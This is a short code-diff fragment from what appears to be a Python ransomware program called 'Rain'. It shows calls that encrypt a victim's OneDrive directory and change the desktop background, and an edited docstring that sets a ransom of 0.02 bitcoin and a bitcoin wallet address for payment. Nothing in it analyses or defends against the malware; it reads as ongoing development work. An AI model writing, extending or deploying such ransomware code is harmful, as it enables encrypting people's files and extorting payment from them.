@@ -388,7 +388,8 @@ crypto.crypt_directory(onedrive)
 
 crypto.change_background(appdata)
 
-""" Instance of the GUI class, this class coming from the interface part of the program
+""" Instance of GUI class through thread window, this class coming from the interface part of the program
+
     Name used for Ransomware - Rain
     Amount to be paid (in bitcoins) - 0.02
     Wallet to be paid - 18mB1n8bDXHxie9R4qAqHibUppaiwuQYXK
